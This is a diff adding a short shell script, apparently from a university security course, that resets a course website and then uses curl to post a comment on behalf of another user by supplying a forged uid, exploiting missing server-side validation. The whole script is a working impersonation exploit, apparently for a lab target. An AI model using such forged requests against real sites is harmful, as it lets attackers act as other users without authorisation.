@@ -1,0 +1,5 @@
+echo "******************************************************************"
+echo "this script will first reset the website, and then make a comment on the first post on behalf of cmcknigh"
+echo "******************************************************************"
+curl "http://ugster20.student.cs.uwaterloo.ca/reset/r82zhang"
+curl -d "comment=hacked, there is no validation here" -d "form=comment" -d "parent=1" -d "uid=3" -d "submit=post" "http://$1/post.php"
